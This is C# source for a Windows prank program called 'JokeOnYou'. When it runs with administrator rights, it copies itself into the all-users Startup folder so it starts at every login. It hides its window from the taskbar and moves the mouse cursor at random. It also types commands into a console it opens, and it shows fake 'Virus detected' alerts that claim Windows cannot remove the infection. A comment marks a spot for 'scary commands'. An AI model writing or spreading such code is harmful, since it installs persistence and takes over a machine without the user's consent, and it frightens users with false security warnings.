using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;

namespace JokeOnYou
{
    public partial class Joy : Form
    {
        private Thread movingThread;
        string myLogPath, sourceFile, destFile;
        bool logging = false;

        [DllImport("User32.dll")]
        static extern int SetForegroundWindow(IntPtr point);

        public Joy()
        {
            InitializeComponent();
        }

        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;
            }
        }

        private void Joy_Load(object sender, EventArgs e)
        {
            myLogPath = Application.StartupPath + "\\logs.txt";
            sourceFile = Application.ExecutablePath;
            destFile = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\JOY.exe";
            WriteLog("Open", true);
            try
            {
                if (IsRunAsAdmin())
                {
                    logging = true;
                    if (!destFile.Equals(sourceFile))
                    {
                        File.Copy(sourceFile, destFile, false);
                        WriteLog("Bugging " + WindowsIdentity.GetCurrent().Name);
                    }
                    EndIt();
                } else

                Location = new Point(Screen.PrimaryScreen.WorkingArea.Width - Width, Screen.PrimaryScreen.WorkingArea.Height - 13);
                movingThread = new Thread(new ThreadStart(MoveIt));
                movingThread.Start();
            } catch (Exception ex)
            {
                WriteLog(ex.Message);
                DuckIt();
            }
        }

        private void MoveIt()
        {
            Random random = new Random();
            bool first = true;
            while (true)
            {
                int time = random.Next(1, 60);
                int moves = random.Next(5, 25);
                int distance = random.Next(50, 80);
                if ((moves + distance) == 60)
                {
                    WriteLog("Joke Time!");
                    DuckIt();
                    continue;
                }
                if (first || (moves + distance) == 80)
                {
                    moves = 100;
                    distance = 30;
                    WriteLog("BONUS ROUND! Going crazy in " + time + " seconds.");
                    first = false;
                } else
                    WriteLog("Moving in " + time + " seconds. " + moves + " steps as far as " + distance + "px.");
                for (int x = 0; x < time; x++)
                {
                    string log = "Moving in " + (time - x) + "\". " + moves + " steps.\r\n";
                    AppendText(log);
                    Thread.Sleep(1000);
                }
                for (int x = 0; x < moves; x++)
                {
                    int cursorX = Cursor.Position.X;
                    int cursorY = Cursor.Position.Y;
                    int tempX = cursorX + (int) Math.Round(random.NextDouble() * (distance) - distance/2);
                    int tempY = cursorY + (int) Math.Round(random.NextDouble() * (distance) - distance/2);
                    while (true)
                    {
                        if (cursorX == tempX || cursorY == tempY)
                            break;
                        cursorX = (tempX > cursorX) ? cursorX + 1 : cursorX - 1;
                        cursorY = (tempY > cursorY) ? cursorY + 1 : cursorY - 1;
                        Cursor.Position = new Point(cursorX, cursorY);
                        Thread.Sleep(1);
                    }
                }
            }
        }

        private void DuckIt()
        {
            Process p = Process.Start("cmd.exe");
            Thread.Sleep(100);
            IntPtr h = p.MainWindowHandle;
            SetForegroundWindow(h);
            // TODO: insert scary commands
            string[] commands = new string[2] { "cd C:\\", "tree" };
            SendKeys.Send("color a");
            SendKeys.SendWait("{ENTER}");
            SendKeys.Send("CLS");
            SendKeys.SendWait("{ENTER}");
            foreach (string command in commands)
            {
                foreach (char letter in command)
                {
                    SendKeys.Send(letter.ToString());
                    Thread.Sleep(150);
                }
                SendKeys.Send("{ENTER}");
                Thread.Sleep(500);
            }
            Thread.Sleep(3500);
            SendKeys.Send("^+{C}");
            p.CloseMainWindow();
            string[] alarms = new string[4] {
                "Virus detected.\r\n\r\nWindows is trying to remove it.",
                "Virus can not be removed.",
                "I'm sorry. I can't do anything.\r\nPress \"OK\" to contact Microsoft Help.",
                "Желаю счастливого дня"
            };
            string[] titles = new string[4] {
                "Alert",
                "Alarm",
                "Error",
                "Добрый день"
            };
            List<MessageBoxButtons> buttons = new List<MessageBoxButtons> {
                MessageBoxButtons.OK,
                MessageBoxButtons.RetryCancel,
                MessageBoxButtons.YesNo,
                MessageBoxButtons.OK
            };
            List<MessageBoxIcon> icons = new List<MessageBoxIcon> {
                MessageBoxIcon.Information,
                MessageBoxIcon.Warning,
                MessageBoxIcon.Error,
                MessageBoxIcon.Question
            };
            int x = 0;
            bool stop = false, quit = false;
            while (true)
            {
                DialogResult result = MessageBox.Show(
                    this, 
                    alarms[x],
                    titles[x], 
                    buttons[x], 
                    icons[x]);
                switch (result)
                {
                    case DialogResult.OK:
                        if (stop)
                            quit = true;
                        x = 1;
                        stop = true;
                        break;
                    case DialogResult.Retry:
                        x = 2;
                        break;
                    case DialogResult.Cancel:
                        x = 1;
                        break;
                    case DialogResult.Yes:
                    case DialogResult.No:
                        x = 3;
                        break;
                }
                if (quit)
                    break;
            }
        }

        private void StopIt(object sender, EventArgs e)
        {
            try
            {
                movingThread.Interrupt();
            } catch (Exception ex)
            {
                WriteLog(ex.Message);
            }
            EndIt();
        }

        private void EndIt()
        {
            WriteLog("Closed");
            Close();
        }

        private void AppendText(string logValue)
        {
            if (log.InvokeRequired)
                log.BeginInvoke(new Action<string>(AppendText), logValue);
            else
                log.Text = logValue;
        }

        private void WriteLog(string log, bool launch = false)
        {
            if (logging || !destFile.Equals(sourceFile))
                using (StreamWriter sw = (File.Exists(myLogPath)) ? File.AppendText(myLogPath) : File.CreateText(myLogPath))
                {
                    if (launch)
                        log = DateTime.Now.ToString("dd/MM/yyyy - HH:mm:ss") + "\t" + log;
                    else
                        log = "\t\t\t " + DateTime.Now.ToString("HH:mm:ss") + "\t" + log;
                    sw.WriteLine(log);
                }
        }

        private bool IsRunAsAdmin()
        {
            WindowsIdentity id = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(id);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}